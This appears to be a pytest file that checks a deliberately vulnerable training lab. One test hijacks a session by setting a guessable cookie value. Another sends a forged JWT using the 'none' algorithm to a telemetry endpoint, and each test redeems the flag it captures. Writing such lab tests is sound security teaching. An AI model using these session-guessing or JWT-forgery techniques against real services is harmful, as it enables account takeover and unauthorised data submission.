def test_sessionid_teach_guessable_token(anon_session, alice, base_url, extract_flag_fn, redeem_flag_fn):
    anon_session.cookies.set("wgs_session", "100000")
    resp = anon_session.get(f"{base_url}/dashboard", timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)


def test_jwt_exercise_alg_none(anon_session, alice, base_url, redeem_flag_fn, forge_none_alg_jwt_fn):
    forged = forge_none_alg_jwt_fn("MTR-1001")
    resp = anon_session.post(
        f"{base_url}/api/telemetry",
        headers={"Authorization": f"Bearer {forged}"},
        json={"reading_kwh": 1.23},
        timeout=10,
    )
    assert resp.status_code == 200
    flag = resp.json().get("flag")
    assert flag
    assert redeem_flag_fn(alice, base_url, flag)
